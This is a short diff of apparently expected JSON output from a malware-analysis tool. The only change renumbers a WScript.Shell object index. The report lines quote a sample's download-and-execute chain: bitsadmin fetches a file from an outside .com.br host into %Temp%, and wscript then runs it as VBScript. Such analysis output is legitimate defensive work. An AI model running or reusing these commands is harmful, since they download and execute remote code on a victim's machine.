@@ -38,7 +38,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[9]()\n",
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[10]()\n",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -60,7 +60,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[9].run(\"bitsadmin /transfer 8 \"https://skynetx.com.br/info2.txt\" %Temp%VB\", 0, true)\n\n\t\tWScript.Shell[9].run(\"wscript //E:VBScript %Temp%VB\")\n",
+        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[10].run(\"bitsadmin /transfer 8 \"https://skynetx.com.br/info2.txt\" %Temp%VB\", 0, true)\n\n\t\tWScript.Shell[10].run(\"wscript //E:VBScript %Temp%VB\")\n",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
